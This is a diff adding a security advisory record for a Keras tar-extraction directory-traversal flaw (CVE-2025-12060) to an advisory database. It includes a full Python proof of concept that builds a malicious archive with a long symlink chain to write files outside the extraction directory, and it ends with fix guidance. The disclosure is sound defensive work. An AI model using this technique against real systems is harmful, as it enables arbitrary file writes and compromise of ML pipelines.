@@ -1,0 +1,180 @@
+{
+  "id": "GHSA-hjqc-jx6g-rwp9",
+  "modified": "2025-12-02T01:27:39.551400Z",
+  "published": "2025-12-02T00:58:33Z",
+  "aliases": [
+    "CVE-2025-12060"
+  ],
+  "summary": "Keras Directory Traversal Vulnerability",
+  "details": "## Summary\n\nKeras's `keras.utils.get_file()` function is vulnerable to directory traversal attacks despite implementing `filter_safe_paths()`. The vulnerability exists because `extract_archive()` uses Python's `tarfile.extractall()` method without the security-critical `filter=\"data\"` parameter. A PATH_MAX symlink resolution bug occurs before path filtering, allowing malicious tar archives to bypass security checks and write files outside the intended extraction directory.\n\n## Details\n\n### Root Cause Analysis\n\n**Current Keras Implementation**\n```python\n# From keras/src/utils/file_utils.py#L121\nif zipfile.is_zipfile(file_path):\n    # Zip archive.\n    archive.extractall(path)\nelse:\n    # Tar archive, perhaps unsafe. Filter paths.\n    archive.extractall(path, members=filter_safe_paths(archive))\n```\n\n### The Critical Flaw\n\nWhile Keras attempts to filter unsafe paths using `filter_safe_paths()`, this filtering happens after the tar archive members are parsed and before actual extraction. However, the PATH_MAX symlink resolution bug occurs during extraction, not during member enumeration.\n\n**Exploitation Flow:**\n1. **Archive parsing**: `filter_safe_paths()` sees symlink paths that appear safe\n2. **Extraction begins**: `extractall()` processes the filtered members\n3. **PATH_MAX bug triggers**: Symlink resolution fails due to path length limits\n4. **Security bypass**: Failed resolution causes literal path interpretation\n5. **Directory traversal**: Files written outside intended directory\n\n### Technical Details\n\nThe vulnerability exploits a known issue in Python's `tarfile` module where excessively long symlink paths can cause resolution failures, leading to the symlink being treated as a literal path. This bypasses Keras's path filtering because:\n\n- `filter_safe_paths()` operates on the parsed tar member information\n- The PATH_MAX bug occurs during actual file system operations in `extractall()`\n- Failed symlink resolution falls back to literal path interpretation\n- This allows traversal paths like `../../../../etc/passwd` to be written\n\n### Affected Code Location\n\n**File**: `keras/src/utils/file_utils.py`  \n**Function**: `extract_archive()` around line 121  \n**Issue**: Missing `filter=\"data\"` parameter in `tarfile.extractall()`\n\n## Proof of Concept\n```\n#!/usr/bin/env python3\nimport os, io, sys, tarfile, pathlib, platform, threading, time\nimport http.server, socketserver\n\n# Import Keras directly (not through TensorFlow)\ntry:\n    import keras\n    print(\"Using standalone Keras:\", keras.__version__)\n    get_file = keras.utils.get_file\nexcept ImportError:\n    try:\n        import tensorflow as tf\n        print(\"Using Keras via TensorFlow:\", tf.keras.__version__)\n        get_file = tf.keras.utils.get_file\n    except ImportError:\n        print(\"Neither Keras nor TensorFlow found!\")\n        sys.exit(1)\n\nprint(\"=\" * 60)\nprint(\"Keras get_file() PATH_MAX Symlink Vulnerability PoC\")\nprint(\"=\" * 60)\nprint(\"Python:\", sys.version.split()[0])\nprint(\"Platform:\", platform.platform())\n\nroot = pathlib.Path.cwd()\nprint(f\"Working directory: {root}\")\n\n# Create target directory for exploit demonstration\nexploit_dir = root / \"exploit\"\nexploit_dir.mkdir(exist_ok=True)\n\n# Clean up any previous exploit files\ntry:\n    (exploit_dir / \"keras_pwned.txt\").unlink()\nexcept FileNotFoundError:\n    pass\n\nprint(f\"\\n=== INITIAL STATE ===\")\nprint(f\"Exploit directory: {exploit_dir}\")\nprint(f\"Files in exploit/: {[f.name for f in exploit_dir.iterdir()]}\")\n\n# Create malicious tar with PATH_MAX symlink resolution bug\nprint(f\"\\n=== Building PATH_MAX Symlink Exploit ===\")\n\n# Parameters for PATH_MAX exploitation\ncomp = 'd' * (55 if sys.platform == 'darwin' else 247)\nsteps = \"abcdefghijklmnop\"  # 16-step symlink chain\npath = \"\"\n\nwith tarfile.open(\"keras_dataset.tgz\", mode=\"w:gz\") as tar:\n    print(\"Creating deep symlink chain...\")\n    \n    # Build the symlink chain that will exceed PATH_MAX during resolution\n    for i, step in enumerate(steps):\n        # Directory with long name\n        dir_info = tarfile.TarInfo(os.path.join(path, comp))\n        dir_info.type = tarfile.DIRTYPE\n        tar.addfile(dir_info)\n        \n        # Symlink pointing to that directory\n        link_info = tarfile.TarInfo(os.path.join(path, step))\n        link_info.type = tarfile.SYMTYPE\n        link_info.linkname = comp\n        tar.addfile(link_info)\n        \n        path = os.path.join(path, comp)\n        \n        if i \u003c 3 or i % 4 == 0:  # Print progress for first few and every 4th\n            print(f\"  Step {i+1}: {step} -\u003e {comp[:20]}...\")\n    \n    # Create the final symlink that exceeds PATH_MAX\n    # This is where the symlink resolution breaks down\n    long_name = \"x\" * 254\n    linkpath = os.path.join(\"/\".join(steps), long_name)\n    \n    max_link = tarfile.TarInfo(linkpath)\n    max_link.type = tarfile.SYMTYPE\n    max_link.linkname = (\"../\" * len(steps))\n    tar.addfile(max_link)\n    \n    print(f\"✓ Created PATH_MAX symlink: {len(linkpath)} characters\")\n    print(f\"  Points to: {'../' * len(steps)}\")\n    \n    # Exploit file through the broken symlink resolution\n    exploit_path = linkpath + \"/../../../exploit/keras_pwned.txt\"\n    exploit_content = b\"KERAS VULNERABILITY CONFIRMED!\\nThis file was created outside the cache directory!\\nKeras get_file() is vulnerable to PATH_MAX symlink attacks!\\n\"\n    \n    exploit_file = tarfile.TarInfo(exploit_path)\n    exploit_file.type = tarfile.REGTYPE\n    exploit_file.size = len(exploit_content)\n    tar.addfile(exploit_file, fileobj=io.BytesIO(exploit_content))\n    \n    print(f\"✓ Added exploit file via broken symlink path\")\n    \n    # Add legitimate dataset content\n    dataset_content = b\"# Keras Dataset Sample\\nThis appears to be a legitimate ML dataset\\nimage1.jpg,cat\\nimage2.jpg,dog\\nimage3.jpg,bird\\n\"\n    dataset_file = tarfile.TarInfo(\"dataset/labels.csv\")\n    dataset_file.type = tarfile.REGTYPE\n    dataset_file.size = len(dataset_content)\n    tar.addfile(dataset_file, fileobj=io.BytesIO(dataset_content))\n    \n    # Dataset directory\n    dataset_dir = tarfile.TarInfo(\"dataset/\")\n    dataset_dir.type = tarfile.DIRTYPE\n    tar.addfile(dataset_dir)\n\nprint(\"✓ Malicious Keras dataset created\")\n\n# Comparison Test: Python tarfile with filter (SAFE)\nprint(f\"\\n=== COMPARISON: Python tarfile with data filter ===\")\ntry:\n    with tarfile.open(\"keras_dataset.tgz\", \"r:gz\") as tar:\n        tar.extractall(\"python_safe\", filter=\"data\")\n    \n    files_after = [f.name for f in exploit_dir.iterdir()]\n    print(f\"✓ Python safe extraction completed\")\n    print(f\"Files in exploit/: {files_after}\")\n    \n    # Cleanup\n    import shutil\n    if pathlib.Path(\"python_safe\").exists():\n        shutil.rmtree(\"python_safe\", ignore_errors=True)\n        \nexcept Exception as e:\n    print(f\"❌ Python safe extraction blocked: {str(e)[:80]}...\")\n    files_after = [f.name for f in exploit_dir.iterdir()]\n    print(f\"Files in exploit/: {files_after}\")\n\n# Start HTTP server to serve malicious archive\nclass SilentServer(http.server.SimpleHTTPRequestHandler):\n    def log_message(self, *args): pass\n\ndef run_server():\n    with socketserver.TCPServer((\"127.0.0.1\", 8005), SilentServer) as httpd:\n        httpd.allow_reuse_address = True\n        httpd.serve_forever()\n\nserver = threading.Thread(target=run_server, daemon=True)\nserver.start()\ntime.sleep(0.3)\n\n# Keras vulnerability test\ncache_dir = root / \"keras_cache\"\ncache_dir.mkdir(exist_ok=True)\nurl = \"http://127.0.0.1:8005/keras_dataset.tgz\"\n\nprint(f\"\\n=== KERAS VULNERABILITY TEST ===\")\nprint(f\"Testing: keras.utils.get_file() with extract=True\")\nprint(f\"URL: {url}\")\nprint(f\"Cache: {cache_dir}\")\nprint(f\"Expected extraction: keras_cache/datasets/keras_dataset/\")\nprint(f\"Exploit target: exploit/keras_pwned.txt\")\n\ntry:\n    # The vulnerable Keras call\n    extracted_path = get_file(\n        \"keras_dataset\",\n        url,\n        cache_dir=str(cache_dir),\n        extract=True\n    )\n    print(f\"✓ Keras extraction completed\")\n    print(f\"✓ Returned path: {extracted_path}\")\n    \nexcept Exception as e:\n    print(f\"❌ Keras extraction failed: {e}\")\n    import traceback\n    traceback.print_exc()\n\n# Vulnerability assessment\nprint(f\"\\n=== VULNERABILITY RESULTS ===\")\nfinal_exploit_files = [f.name for f in exploit_dir.iterdir()]\nprint(f\"Files in exploit directory: {final_exploit_files}\")\n\nif \"keras_pwned.txt\" in final_exploit_files:\n    print(f\"\\n🚨 KERAS VULNERABILITY CONFIRMED! 🚨\")\n    \n    exploit_file = exploit_dir / \"keras_pwned.txt\"\n    content = exploit_file.read_text()\n    print(f\"Exploit file created: {exploit_file}\")\n    print(f\"Content:\\n{content}\")\n    \n    print(f\"🔍 TECHNICAL DETAILS:\")\n    print(f\"   • Keras uses tarfile.extractall() without filter parameter\")\n    print(f\"   • PATH_MAX symlink resolution bug bypassed security checks\")\n    print(f\"   • File created outside intended cache directory\")\n    print(f\"   • Same vulnerability pattern as TensorFlow get_file()\")\n    \n    print(f\"\\n📊 COMPARISON RESULTS:\")\n    print(f\"   ✅ Python with filter='data': BLOCKED exploit\")\n    print(f\"   ⚠️  Keras get_file(): ALLOWED exploit\")\n    \nelse:\n    print(f\"✅ No exploit files detected\")\n    print(f\"Possible reasons:\")\n    print(f\"   • Keras version includes security patches\")\n    print(f\"   • Platform-specific path handling prevented exploit\")\n    print(f\"   • Archive extraction path differed from expected\")\n\n# Show what Keras actually extracted (safely)\nprint(f\"\\n=== KERAS EXTRACTION ANALYSIS ===\")\ntry:\n    if 'extracted_path' in locals() and pathlib.Path(extracted_path).exists():\n        keras_path = pathlib.Path(extracted_path)\n        print(f\"Keras extracted to: {keras_path}\")\n        \n        # Safely list contents\n        try:\n            contents = [item.name for item in keras_path.iterdir()]\n            print(f\"Top-level contents: {contents}\")\n            \n            # Count symlinks (indicates our exploit structure was created)\n            symlink_count = 0\n            for item in keras_path.iterdir():\n                try:\n                    if item.is_symlink():\n                        symlink_count += 1\n                except PermissionError:\n                    continue\n            \n            print(f\"Symlinks created: {symlink_count}\")\n            if symlink_count \u003e 0:\n                print(f\"✓ PATH_MAX symlink chain was extracted\")\n                \n        except PermissionError:\n            print(f\"Permission errors in extraction directory (expected with symlink corruption)\")\n            \nexcept Exception as e:\n    print(f\"Could not analyze Keras extraction: {e}\")\n\nprint(f\"\\n=== REMEDIATION ===\")\nprint(f\"To fix this vulnerability, Keras should use:\")\nprint(f\"```python\")\nprint(f\"tarfile.extractall(path, filter='data')  # Safe\")\nprint(f\"```\")\nprint(f\"Instead of:\")\nprint(f\"```python\") \nprint(f\"tarfile.extractall(path)  # Vulnerable\")\nprint(f\"```\")\n\n# Cleanup\nprint(f\"\\n=== CLEANUP ===\")\ntry:\n    os.unlink(\"keras_dataset.tgz\")\n    print(f\"✓ Removed malicious tar file\")\nexcept:\n    pass\n\nprint(\"PoC completed!\")\n\n```\n### Environment Setup\n- **Python**: 3.8+ (tested on multiple versions)\n- **Keras**: Standalone Keras or TensorFlow.Keras\n- **Platform**: Linux, macOS, Windows (path handling varies)\n\n### Exploitation Steps\n\n1. **Create malicious tar archive** with PATH_MAX symlink chain\n2. **Host archive** on accessible HTTP server\n3. **Call `keras.utils.get_file()`** with `extract=True`\n4. **Observe directory traversal** - files written outside cache directory\n\n### Key Exploit Components\n\n- **Deep symlink chain**: 16+ nested symlinks with long directory names\n- **PATH_MAX overflow**: Final symlink path exceeding system limits\n- **Traversal payload**: Relative path traversal (`../../../target/file`)\n- **Legitimate disguise**: Archive contains valid-looking dataset files\n\n### Demonstration Results\n\n**Vulnerable behavior:**\n- Files extracted outside intended `cache_dir/datasets/` location\n- Security filtering bypassed completely\n- No error or warning messages generated\n\n**Expected secure behavior:**\n- Extraction blocked or confined to cache directory\n- Security warnings for suspicious archive contents\n\n## Impact\n\n### Vulnerability Classification\n- **Type**: Directory Traversal / Path Traversal (CWE-22)\n- **Severity**: High\n- **CVSS Components**: Network accessible, no authentication required, impacts confidentiality and integrity\n\n### Who Is Impacted\n\n**Direct Impact:**\n- Applications using `keras.utils.get_file()` with `extract=True`\n- Machine learning pipelines downloading and extracting datasets\n- Automated ML training systems processing external archives\n\n**Attack Scenarios:**\n1. **Malicious datasets**: Attacker hosts compromised ML dataset\n2. **Supply chain**: Legitimate dataset repositories compromised\n3. **Model poisoning**: Extraction writes malicious files alongside training data\n4. **System compromise**: Configuration files, executables written to system directories\n\n**Affected Environments:**\n- Research environments downloading public datasets\n- Production ML systems with automated dataset fetching\n- Educational platforms using Keras for tutorials\n- CI/CD pipelines training models with external data\n\n### Risk Assessment\n\n**High Risk Factors:**\n- Common usage pattern in ML workflows\n- No user awareness of extraction security\n- Silent failure mode (no warnings)\n- Cross-platform vulnerability\n\n**Potential Consequences:**\n- Arbitrary file write on target system\n- Configuration file tampering\n- Code injection via overwritten scripts\n- Data exfiltration through planted files\n- System compromise in containerized environments\n\n## Recommended Fix\n\n### Immediate Mitigation\n\nReplace the vulnerable extraction code with:\n\n```python\n# Secure implementation\nif zipfile.is_zipfile(file_path):\n    # Zip archive - implement similar filtering\n    archive.extractall(path, members=filter_safe_paths(archive))\nelse:\n    # Tar archive with proper security filter\n    archive.extractall(path, members=filter_safe_paths(archive), filter=\"data\")\n```\n\n### Long-term Solution\n\n1. **Add `filter=\"data\"` parameter** to all `tarfile.extractall()` calls\n2. **Implement comprehensive path validation** before extraction\n3. **Add extraction logging** for security monitoring\n4. **Consider sandboxed extraction** for untrusted archives\n5. **Update documentation** to warn about archive security risks\n\n### Backward Compatibility\n\nThe fix maintains full backward compatibility as `filter=\"data\"` is the recommended secure default for Python 3.12+.\n\n## References\n\n- [[Python tarfile security documentation](https://docs.python.org/3/library/tarfile.html#extraction-filters)](https://docs.python.org/3/library/tarfile.html#extraction-filters)\n- [[CVE-2007-4559](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559) - Related tarfile vulnerability\n- [[OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)](https://owasp.org/www-community/attacks/Path_Traversal)\n\nNote: Reported in Huntr as well, but didn't get response\nhttps://huntr.com/bounties/f94f5beb-54d8-4e6a-8bac-86d9aee103f4",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "keras",
+        "purl": "pkg:pypi/keras"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.12.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.2.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "1.0.3",
+        "1.0.4",
+        "1.0.5",
+        "1.0.6",
+        "1.0.7",
+        "1.0.8",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.2.0",
+        "1.2.1",
+        "1.2.2",
+        "2.0.0",
+        "2.0.1",
+        "2.0.2",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "2.0.6",
+        "2.0.7",
+        "2.0.8",
+        "2.0.9",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2",
+        "2.1.3",
+        "2.1.4",
+        "2.1.5",
+        "2.1.6",
+        "2.10.0",
+        "2.10.0rc0",
+        "2.10.0rc1",
+        "2.11.0",
+        "2.11.0rc0",
+        "2.11.0rc1",
+        "2.11.0rc2",
+        "2.11.0rc3",
+        "2.12.0",
+        "2.12.0rc0",
+        "2.12.0rc1",
+        "2.13.1",
+        "2.13.1rc0",
+        "2.13.1rc1",
+        "2.14.0",
+        "2.14.0rc0",
+        "2.15.0",
+        "2.15.0rc0",
+        "2.15.0rc1",
+        "2.2.0",
+        "2.2.1",
+        "2.2.2",
+        "2.2.3",
+        "2.2.4",
+        "2.2.5",
+        "2.3.0",
+        "2.3.1",
+        "2.4.0",
+        "2.4.1",
+        "2.4.2",
+        "2.4.3",
+        "2.5.0rc0",
+        "2.6.0",
+        "2.6.0rc0",
+        "2.6.0rc1",
+        "2.6.0rc2",
+        "2.6.0rc3",
+        "2.7.0",
+        "2.7.0rc0",
+        "2.7.0rc2",
+        "2.8.0",
+        "2.8.0rc0",
+        "2.8.0rc1",
+        "2.9.0",
+        "2.9.0rc0",
+        "2.9.0rc1",
+        "2.9.0rc2",
+        "3.0.0",
+        "3.0.1",
+        "3.0.2",
+        "3.0.3",
+        "3.0.4",
+        "3.0.5",
+        "3.1.0",
+        "3.1.1",
+        "3.10.0",
+        "3.11.0",
+        "3.11.1",
+        "3.11.2",
+        "3.11.3",
+        "3.2.0",
+        "3.2.1",
+        "3.3.0",
+        "3.3.1",
+        "3.3.2",
+        "3.3.3",
+        "3.4.0",
+        "3.4.1",
+        "3.5.0",
+        "3.6.0",
+        "3.7.0",
+        "3.8.0",
+        "3.9.0",
+        "3.9.1",
+        "3.9.2"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.11.3",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-hjqc-jx6g-rwp9/GHSA-hjqc-jx6g-rwp9.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/keras-team/keras/security/advisories/GHSA-hjqc-jx6g-rwp9"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-12060"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-12638"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/keras-team/keras/pull/21760"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/keras-team/keras/commit/47fcb397ee4caffd5a75efd1fa3067559594e951"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/keras-team/keras"
+    },
+    {
+      "type": "WEB",
+      "url": "https://huntr.com/bounties/f94f5beb-54d8-4e6a-8bac-86d9aee103f4"
+    }
+  ]
+}
